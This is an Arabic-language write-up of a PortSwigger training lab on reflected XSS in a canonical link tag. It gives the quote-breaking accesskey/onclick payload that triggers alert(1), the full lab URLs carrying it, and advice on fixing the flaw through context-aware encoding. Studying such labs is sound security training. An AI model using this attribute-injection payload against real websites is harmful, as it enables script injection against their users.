# [Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)

## **`الهدف`**
قم بتنفيذ هجوم `XSS` يقوم بحقن سمة `attribute` تستدعي دالة `alert` في الصفحة الرئيسية .
## **`خطوات الحل`**
 نقوم بحقن الأمر التالي كـ `Parameter` في نهاية الـ `URL`  الخاص باللاب لننتهي من حل اللاب.
```JS
'accesskey='x'onclick='alert(1)
```
ليصبح كالتالي
```URL
https://0a6600ce04fd62e280931ca8003200ba.web-security-academy.net/?'accesskey='x'onclick='alert(1)
```

وبعد الانتقال إليه سيتم عمل `URL Encoded` له ليصبح كالتالي:
```URL
https://0a6600ce04fd62e280931ca8003200ba.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [Reflected XSS into HTML context with nothing encoded](./Reflected-XSS-into-HTML-context-with-nothing-encoded.md)

ويجب على الترميز أن يكون `Context-Aware`، بما أن الحقن هنا يحدث داخل سمة `href` داخل وسم `link`، فيجب ترميز علامات التنصيص الفردية `'` إلى `&#39;` والمزدوجة `"` إلى `&quot;` وعدم الاكتفاء بترميز الأقواس فقط.

وبما أن المدخل ينعكس في الرابط، فيجب على السيرفر استخدام دوال الـ` URL Encoding` القياسية للمتغيرات قبل دمجها في الـ `HTML` فإن تحويل `'` إلى `%27` من جهة السيرفر سيجعل المتصفح يقرأها كجزء من الرابط وليس كبداية لسمة جديدة.
